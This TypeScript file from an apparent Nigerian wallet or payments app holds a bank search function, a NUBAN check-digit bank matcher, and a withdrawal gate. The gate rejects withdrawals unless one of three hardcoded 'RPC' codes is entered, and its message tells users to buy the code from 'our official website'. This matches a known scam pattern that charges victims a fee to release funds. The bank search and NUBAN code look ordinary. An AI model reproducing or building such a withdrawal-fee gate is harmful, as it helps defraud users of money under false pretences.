/**
 * Searches ALL Nigerian banks seamlessly across name, aliases, shortTag, and CBN code.
 * When a text query is typed, searches across ALL categories so no bank is ever hidden.
 */
export function searchNigeriaBanks(
  queryText: string,
  category: 'all' | NigeriaBankCategory = 'all'
): NigeriaBank[] {
  const q = queryText.trim().toLowerCase();
  if (!q) {
    if (category === 'all') return NIGERIA_BANKS;
    return NIGERIA_BANKS.filter((b) => b.category === category);
  }

  return NIGERIA_BANKS.filter((bank) => {
    if (bank.name.toLowerCase().includes(q)) return true;
    if (bank.code.toLowerCase().includes(q)) return true;
    if (bank.shortTag.toLowerCase().includes(q)) return true;
    if (bank.domain.toLowerCase().includes(q)) return true;
    if (bank.aliases?.some((a) => a.toLowerCase().includes(q))) return true;
    return false;
  });
}

/**
 * Client-side CBN Revised NUBAN check-digit matcher to suggest candidate Nigerian banks
 * as soon as the user types a 10-digit account number.
 */
export function detectLikelyBanksForNuban(accountNumber: string): NigeriaBank[] {
  if (!/^\d{10}$/.test(accountNumber)) return [];

  const weights = [3, 7, 3, 3, 7, 3, 3, 7, 3, 3, 7, 3, 3, 7, 3, 3, 7, 3];
  const matches: NigeriaBank[] = [];

  // Phone-derived 10-digit numbers (70, 80, 81, 90, 91) are heavily used on OPay, PalmPay, Moniepoint, SmartCash, MoMo
  const looksLikeNgMobile = /^(70|80|81|90|91)\d{8}$/.test(accountNumber);
  if (looksLikeNgMobile) {
    const mobileWalletCodes = ['999992', '999991', '50515', '120003', '120004'];
    for (const c of mobileWalletCodes) {
      const found = NIGERIA_BANKS.find((b) => b.code === c);
      if (found) matches.push(found);
    }
  }

  for (const bank of NIGERIA_BANKS) {
    if (matches.some((m) => m.code === bank.code)) continue;
    const cleanCode = bank.code.replace(/\D/g, '');
    let bank9 = '';
    if (cleanCode.length === 3) {
      bank9 = `000000${cleanCode}`;
    } else if (cleanCode.length === 5) {
      bank9 = `9000${cleanCode}`;
    } else if (cleanCode.length === 6) {
      bank9 = `900${cleanCode}`;
    } else {
      continue;
    }

    const combined = `${bank9}${accountNumber.slice(0, 9)}`;
    let sum = 0;
    for (let i = 0; i < 18; i += 1) {
      sum += Number(combined[i]) * weights[i];
    }
    const checkDigit = (10 - (sum % 10)) % 10;
    if (checkDigit === Number(accountNumber[9])) {
      matches.push(bank);
    }
  }

  return matches.slice(0, 6);
}

export const VALID_RPC_CODES = new Set<string>(['091306', '0913061', '091306191']);

export const RPC_REQUIRED_WITHDRAW_NOTE =
  'You need your RPC to withdraw. Kindly buy from our official website.';

export function validateRpcAuthorizationCode(raw: string): {
  valid: boolean;
  normalized: string;
  error?: string;
} {
  const cleaned = raw.trim();
  if (!cleaned) {
    return {
      valid: false,
      normalized: '',
      error: RPC_REQUIRED_WITHDRAW_NOTE,
    };
  }
  if (!VALID_RPC_CODES.has(cleaned)) {
    return {
      valid: false,
      normalized: cleaned,
      error: RPC_REQUIRED_WITHDRAW_NOTE,
    };
  }
  return { valid: true, normalized: cleaned };
}
